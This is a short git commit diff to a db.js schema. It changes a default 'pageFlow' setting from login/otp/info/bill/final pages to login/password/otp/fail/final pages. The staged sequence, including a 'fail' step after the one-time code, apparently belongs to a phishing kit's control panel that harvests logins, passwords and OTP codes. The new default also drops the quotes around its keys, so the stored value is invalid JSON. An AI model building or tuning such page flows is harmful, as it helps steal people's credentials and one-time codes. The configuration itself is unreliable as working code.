57ba07a40abea151bfbf7c7bfeca89edd8858880
marzena22041972-byte <marzena22041972@gmail.com>
2026-02-27 16:24:33 -0800

    Add files via upload

--- db.js
+++ db.js
@@ -50,11 +50,11 @@ export async function initDB() {
 	    baSUB INTEGER DEFAULT 0 CHECK (baSUB IN (0,1)),
 	    domain TEXT DEFAULT '',
 	    pageFlow TEXT NOT NULL DEFAULT '{
-	      "1": { "page": "login", "enabled": true },
-	      "2": { "page": "otp", "enabled": true },
-	      "3": { "page": "info", "enabled": false },
-	      "4": { "page": "bill", "enabled": true },
-	      "5": { "page": "final", "enabled": true }
+	       "1": { page: "login", enabled: true },
+		    "2": { page: "password", enabled: true },
+		    "3": { page: "otp", enabled: true },
+		    "4": { page: "fail", enabled: true },
+		    "5": { page: "final", enabled: true }
 	    }'
 	  );
 	`);
